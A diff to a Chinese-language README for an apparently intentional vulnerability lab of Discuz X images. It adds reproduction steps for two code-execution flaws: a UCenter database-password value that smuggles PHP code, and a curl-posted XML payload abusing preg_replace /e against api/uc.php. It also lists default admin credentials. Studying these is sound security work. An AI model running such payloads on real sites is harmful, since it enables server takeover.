@@ -4,6 +4,11 @@
   * 后台地址http://127.0.0.1/admin.php
   * 管理员账号admin/admin
   * 测试账号test/123456
+  * 更新日期20150609
+* src/discuz/x3.0
+  - 后台地址http://127.0.0.1/admin.php
+  - 管理员账号admin/admin
+  - 更新日期20130511
 
 ## faq.php gids 报错注入
 
@@ -113,3 +118,69 @@ curl --cookie "获取的cookie" -d "a=a" "http://172.17.0.2/portal.php?mod=porta
 ```
 
 其中参数formhash为页面源码中获取的formhash，modarticlekey为跳转链接中的modthreadkey参数，172.17.0.1为SSRF请求的目标机器IP，在该机器上监听80端口，执行以上curl即可触发SSRF
+
+
+
+## Discuz X后台任意代码执行漏洞
+
+测试镜像
+
+- src/discuz/x3.1
+
+影响版本 
+
+- Discuz X系列 <= X3.3
+
+参考链接
+
+- [Discuz X3.3补丁安全分析](https://www.anquanke.com/post/id/86679)
+
+Poc
+
+使用管理员账号登录后台，在 站长->UCenter设置 页面 修改UCenter 数据库账号为shell-test 密码为 123');phpinfo();//  （该账号已预先添加至测试环境），提交后刷新该设置页面即可。
+
+
+
+## Discuz X已知UCenter app_key代码执行漏洞
+
+测试镜像
+
+- src/discuz/x3.0
+
+影响版本 
+
+- Discuz X系列
+
+参考链接
+
+- [Discuz! X系列远程代码执行漏洞分析](https://www.secpulse.com/archives/35819.html)
+
+Poc
+
+（环境已修改api/uc.php用于生成app_key加密数据）
+
+访问包含formhash的页面，获取其中的formhash的value值:
+
+```
+curl -c cookie.txt "http://172.17.0.2/forum.php" | grep 'formhash" value'
+```
+
+访问加密页面获取code:
+
+```
+curl "http://172.17.0.2/api/uc.php?encode=1" 
+```
+
+通过获取到的变量formhash和code构造并访问链接：
+
+```
+curl -X POST -b cookie.txt --data-raw "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>
+<root>
+    <item id=\"balabala\">
+        <item id=\"findpattern\">/.*/e</item>
+        <item id=\"replacement\">phpinfo();</item>
+    </item>
+</root>" "http://172.17.0.2/api/uc.php?formhash=dcac5793&code=0a54WTlZk7uY1TIjIKkpC7bkLgwxnAqnylWAKYTqnbWg0NGt20SBEAeKq6ibWeV81M2MHYFj%2FAd1t3hwZSc64hyG" && rm -f cookie.txt
+```
+
+使用管理员账号登录后台，在 用户->添加用户 页面添加任意用户触发命令执行
